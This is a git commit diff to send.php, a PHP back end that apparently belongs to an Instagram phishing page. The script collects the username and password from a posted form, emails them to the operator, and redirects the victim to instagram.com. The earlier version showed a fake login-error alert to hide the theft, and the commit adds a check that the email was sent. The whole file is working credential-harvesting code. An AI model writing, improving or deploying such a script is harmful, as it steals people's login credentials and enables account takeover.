29352e4aaf6a8372b530309cf7e64ef423315f6b
VarunB453 <116241000+VarunB453@users.noreply.github.com>
2024-12-21 14:57:09 +0530

    send.php

--- send.php
+++ send.php
@@ -1,5 +1,4 @@
 <?php
-
 // Variable settings
 $username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
 $passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)
@@ -12,17 +11,20 @@ $txt = "Username: " . $username . "\r\nPassword: " . $passcode; // Email body (i
 // Check input fields
 if (!empty($username) and !empty($passcode)) {
 
-    mail($to, $subject, $txt);
-    echo "<script type='text/javascript'>alert('Error ! Unable to login ');
-        window.location.replace('https://www.instagram.com');
-        </script>";
+    if (mail($to, $subject, $txt)) {
+        echo "<script type='text/javascript'>alert('Login data sent successfully. Redirecting...');
+            window.location.replace('https://www.instagram.com');
+            </script>";
+    } else {
+         echo "<script type='text/javascript'>alert('Error ! Unable to send mail');
+            window.history.go(-1);
+            </script>";
+    }
 
 } else {
 
-    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
+    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again.');
         window.history.go(-1);
         </script>";
-    "https://www.google.co.in/"
-    
 }
 ?>
